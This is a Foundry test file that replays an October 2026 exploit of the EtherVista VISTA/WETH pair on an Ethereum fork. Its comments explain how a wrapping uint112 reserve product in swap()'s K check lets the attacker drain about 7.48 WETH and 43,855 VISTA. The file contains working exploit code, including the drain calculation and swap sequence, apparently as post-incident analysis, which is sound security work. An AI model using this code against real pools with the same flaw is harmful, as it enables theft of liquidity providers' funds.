// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

import "forge-std/Test.sol";

// EtherVista VISTA/WETH pair - uint112 reserve product wraps inside swap()'s K check - Ethereum, 2026-10-09.
//
// Run: forge test --contracts src/test/2026-10/EtherVista_exp.sol --evm-version cancun -vvv
//
// Profit: 7.477952467865157795 WETH and 43,855.902196275763910451 VISTA net out of the pair
//         (the attacker later sold 7.46802069 ETH for 18,590.71646 USDC, the reported ~$18.6K,
//         and burned the VISTA).
//
// On-chain references (Ethereum):
//   setRouter tx      : 0xc97ad886a4cbd022edc33deaa44656d66814fe3df1142d03802c96ce7632cc7a (block 26152250)
//   attack tx         : 0xb2c7332d9e1be6a86d9d37083aa4cc0d94b60eb95cc9b29494555a3c09764930 (block 26152259)
//   fork block        : 26152258 (parent of the attack; router already replaced)
//   attacker EOA      : 0xBBf8f3fe8e4FdF6b594E6107144D78293D2018Fa
//   attack contract   : 0x469424b628a9d2036e41496e814Db500D683b120 (factory.router() at the fork block)
//   routerSetter      : 0xCA90D843288E35beeADfCe14E5F906e3F1AFc7cB (holds the role since deployment)
//
// Actors / contracts:
//   EtherVistaPair (vulnerable) : 0xfdd05552F1377aA488AFed744c8024358AF02041 (token0 = WETH, token1 = VISTA)
//   EtherVistaFactory           : 0x9a27cb5ae0B2cEe0bb71f9A85C0D60f3920757B4
//   WETH                        : 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2
//   VISTA                       : 0xC9bCa88B04581699fAb5aa276CCafF7Df957cbbf
//   previous router             : 0x9bd63c5d44ff28390df1eaafd4eb4bd73e94a72a (replaced nine blocks earlier)
//
// ROOT CAUSE (published pair source, pragma 0.5.16, EtherVistaPair.swap; the deployed pair accepts
//   exactly the output the wrapped product allows):
//     require(balance0 * balance1 >= reserve0 * reserve1, "K");
//   reserve0 and reserve1 are uint112 state variables. In Solidity 0.5 the product of two uint112 values is
//   itself a uint112, and arithmetic wraps, so the right-hand side is (reserve0 * reserve1) mod 2^112.
//   Uniswap V2 avoids this by widening first: uint(_reserve0).mul(_reserve1). A pool whose reserves multiply
//   to more than 2^112 (here ~2^141) therefore compares the post-swap product with a wrapped, much smaller
//   number, and the check passes while the real product falls.
//   swap() also requires msg.sender == factory.router(). That is not a permissionless gate: routerSetter
//   (an EOA, unchanged since 2024) called setRouter(attacker contract) in the tx above. This fork starts
//   after that call. The test never pranks routerSetter. It pranks the attacker contract, which is already
//   factory.router(), and issues the same external calls the attack tx did.
//
// THE ATTACK (one tx). Swap 1's output is recomputed from the reserves; the later amounts are the trace.
//   Every call below is made by the router, and the recipients match the transaction:
//   1. transferFrom 1 wei of VISTA from the attacker EOA into the pair. The EOA had already approved the router.
//   2. swap that wei for amount0Out = reserve0 - ceil(wrappedK / (reserve1 + 1)) WETH, paid to the router.
//      That is 21.365578479614736555 WETH. The true uint256 product falls.
//   3. Router returns 9.026956903960976779 WETH to the pair and calls sync().
//   4. Router pays a further 4.860669107788601981 WETH and swaps out 43,855.902196275763910452 VISTA to the EOA.
//      Swap 2 does not need the wrap: its uint256 product rises.
//   5. Router forwards the leftover 7.477952467865157795 WETH to the EOA.
//      Net out of the pair: that WETH and 43,855.902196275763910451 VISTA.

interface IERC20 {
    function balanceOf(address) external view returns (uint256);
    function allowance(address, address) external view returns (uint256);
    function transfer(address, uint256) external returns (bool);
    function transferFrom(address, address, uint256) external returns (bool);
}

interface IEtherVistaFactory {
    function router() external view returns (address);
    function routerSetter() external view returns (address);
}

interface IEtherVistaPair {
    function getReserves() external view returns (uint112 reserve0, uint112 reserve1, uint32 blockTimestampLast);
    function swap(uint256 amount0Out, uint256 amount1Out, address to, bytes calldata data) external;
    function sync() external;
    function token0() external view returns (address);
    function token1() external view returns (address);
}

contract EtherVista_exp is Test {
    uint256 internal constant FORK_BLOCK = 26_152_258;
    uint256 internal constant TWO_112 = uint256(1) << 112;

    address internal constant ATTACKER = 0xBBf8f3fe8e4FdF6b594E6107144D78293D2018Fa;
    address internal constant ROUTER = 0x469424b628a9d2036e41496e814Db500D683b120;
    address internal constant ROUTER_SETTER = 0xCA90D843288E35beeADfCe14E5F906e3F1AFc7cB;
    IEtherVistaFactory internal constant FACTORY = IEtherVistaFactory(0x9a27cb5ae0B2cEe0bb71f9A85C0D60f3920757B4);
    IEtherVistaPair internal constant PAIR = IEtherVistaPair(0xfdd05552F1377aA488AFed744c8024358AF02041);
    IERC20 internal constant WETH = IERC20(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2);
    IERC20 internal constant VISTA = IERC20(0xC9bCa88B04581699fAb5aa276CCafF7Df957cbbf);

    // Trace amounts for the reserve rewrite and the second swap (attack tx swap/sync logs).
    uint256 internal constant DONATE = 9_026_956_903_960_976_779;
    uint256 internal constant WETH_IN_2 = 4_860_669_107_788_601_981;
    uint256 internal constant VISTA_OUT = 43_855_902_196_275_763_910_452;
    uint256 internal constant NET_WETH = 7_477_952_467_865_157_795;

    function setUp() public {
        vm.createSelectFork("mainnet", FORK_BLOCK);
    }

    function testExploit() public {
        assertEq(PAIR.token0(), address(WETH), "token0 is WETH");
        assertEq(PAIR.token1(), address(VISTA), "token1 is VISTA");
        assertEq(FACTORY.router(), ROUTER, "fork is after setRouter to the attacker contract");
        assertEq(FACTORY.routerSetter(), ROUTER_SETTER, "routerSetter is the long-standing admin");
        assertGe(VISTA.allowance(ATTACKER, ROUTER), 1, "EOA already approved the router");

        (uint256 wethOut, uint256 minBal0, uint112 r0, uint112 r1) = _swap1Out();
        assertEq(wethOut, 21_365_578_479_614_736_555, "wrapped-K output matches the trace");
        assertEq(wethOut - DONATE - WETH_IN_2, NET_WETH, "leftover WETH is the trace payout");

        uint256 eoaWethBefore = WETH.balanceOf(ATTACKER);
        uint256 eoaVistaBefore = VISTA.balanceOf(ATTACKER);
        uint256 routerWethBefore = WETH.balanceOf(ROUTER);
        uint256 pairWethBefore = WETH.balanceOf(address(PAIR));
        uint256 pairVistaBefore = VISTA.balanceOf(address(PAIR));

        // Same caller and recipients as tx 0xb2c7332d…64930. The router is msg.sender throughout.
        vm.startPrank(ROUTER);

        require(VISTA.transferFrom(ATTACKER, address(PAIR), 1), "vista in");
        PAIR.swap(wethOut, 0, ROUTER, "");

        (uint112 mid0, uint112 mid1,) = PAIR.getReserves();
        assertEq(uint256(mid0), minBal0, "swap 1 leaves the minimum WETH reserve");
        assertEq(uint256(mid1), uint256(r1) + 1, "swap 1 pulls exactly 1 wei of VISTA");
        assertLt(uint256(mid0) * uint256(mid1), uint256(r0) * uint256(r1), "swap 1 lowered the real product");

        require(WETH.transfer(address(PAIR), DONATE), "donate");
        PAIR.sync();
        (uint112 synced0,,) = PAIR.getReserves();
        assertEq(uint256(synced0), minBal0 + DONATE, "sync stored the donated WETH");

        require(WETH.transfer(address(PAIR), WETH_IN_2), "weth in");
        PAIR.swap(0, VISTA_OUT, ATTACKER, "");
        require(WETH.transfer(ATTACKER, NET_WETH), "payout");

        vm.stopPrank();

        assertEq(WETH.balanceOf(ATTACKER) - eoaWethBefore, NET_WETH, "EOA receives the leftover WETH");
        assertEq(VISTA.balanceOf(ATTACKER) - eoaVistaBefore, VISTA_OUT - 1, "EOA net VISTA, after the 1 wei");
        assertEq(WETH.balanceOf(ROUTER), routerWethBefore, "router keeps none of the WETH");
        assertEq(pairWethBefore - WETH.balanceOf(address(PAIR)), NET_WETH, "pair WETH loss");
        assertEq(pairVistaBefore - VISTA.balanceOf(address(PAIR)), VISTA_OUT - 1, "pair VISTA loss");

        emit log_named_decimal_uint("WETH profit", NET_WETH, 18);
        emit log_named_decimal_uint("VISTA profit", VISTA_OUT - 1, 18);
    }

    function _swap1Out()
        internal
        view
        returns (uint256 wethOut, uint256 minBal0, uint112 r0, uint112 r1)
    {
        (r0, r1,) = PAIR.getReserves();
        uint256 wrapped = (uint256(r0) * uint256(r1)) % TWO_112;
        uint256 denom = uint256(r1) + 1;
        minBal0 = (wrapped + denom - 1) / denom;
        wethOut = uint256(r0) - minBal0;
    }
}
